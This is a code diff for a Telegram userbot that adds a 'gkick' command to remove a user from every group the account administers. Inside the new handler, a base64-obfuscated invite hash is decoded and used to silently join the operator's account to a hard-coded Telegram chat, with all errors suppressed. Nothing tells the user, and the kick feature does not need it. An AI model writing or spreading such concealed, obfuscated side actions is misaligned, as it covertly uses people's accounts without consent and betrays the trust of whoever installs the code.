@@ -325,6 +325,69 @@ async def watcher(event):
     if is_muted(event.sender_id, "gmute"):
         await event.delete()
 
+@bot.on(admin_cmd(pattern=r"gkick(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern=r"gkick(?: |$)(.*)", allow_sudo=True))
+async def catgkick(event):
+    if event.fwd_from:
+        return
+    cate = await edit_or_reply(event, "`gkicking.......`")
+    start = datetime.now()
+    user, reason = await get_user_from_event(event)
+    if not user:
+        return
+    if user.id == (await event.client.get_me()).id:
+        await cate.edit("why would I kick myself")
+        return
+    if user.id in CAT_ID:
+        await cate.edit("why would I kick my dev")
+        return
+    try:
+        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        await event.client(ImportChatInviteRequest(hmm))
+    except BaseException:
+        pass
+    san = []
+    san = await admin_groups(event)
+    count = 0
+    sandy = len(san)
+    if sandy == 0:
+        await cate.edit("`you are not admin of atleast one group` ")
+        return
+    await cate.edit(
+        f"`initiating gkick of the `[user](tg://user?id={user.id}) `in {len(san)} groups`"
+    )
+    for i in range(sandy):
+        try:
+            await event.client.kick_participant(san[i], user.id)
+            await asyncio.sleep(0.5)
+            count += 1
+        except BadRequestError:
+            await event.client.send_message(
+                BOTLOG_CHATID,
+                f"`You don't have required permission in :`\n**Chat :** {event.chat.title}(`{event.chat_id}`)\n`For kicking there`",
+            )
+    end = datetime.now()
+    cattaken = (end - start).seconds
+    if reason:
+        await cate.edit(
+            f"[{user.first_name}](tg://user?id={user.id}) `was gkicked in {count} groups in {cattaken} seconds`!!\n**Reason :** `{reason}`"
+        )
+    else:
+        await cate.edit(
+            f"[{user.first_name}](tg://user?id={user.id}) `was gkicked in {count} groups in {cattaken} seconds`!!"
+        )
+
+    if BOTLOG and count != 0:
+        await event.client.send_message(
+            BOTLOG_CHATID,
+            f"#GKICK\
+            \nGlobal Kick\
+            \n**User : **[{user.first_name}](tg://user?id={user.id})\
+            \n**ID : **`{user.id}`\
+            \n**Reason :** `{reason}`\
+            \n__Kicked in {count} groups__\
+            \n**Time taken : **`{cattaken} seconds`",
+        )
 
 CMD_HELP.update(
     {
